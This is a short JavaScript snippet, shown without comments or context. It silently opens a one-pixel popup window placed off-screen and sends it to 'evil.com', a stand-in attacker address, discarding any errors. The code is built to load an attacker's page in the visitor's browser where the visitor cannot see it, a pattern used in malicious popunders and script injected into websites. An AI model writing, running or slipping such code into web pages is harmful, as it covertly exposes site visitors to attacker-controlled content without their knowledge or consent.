(function() {
  try {
    const newWin = window.open('about:blank', '_blank', 'width=1,height=1,left=9999,top=9999');
    
    if (!newWin) {
      return;
    }

    newWin.location.href = "https://evil.com/";
  } catch (e ) {
  }
})();
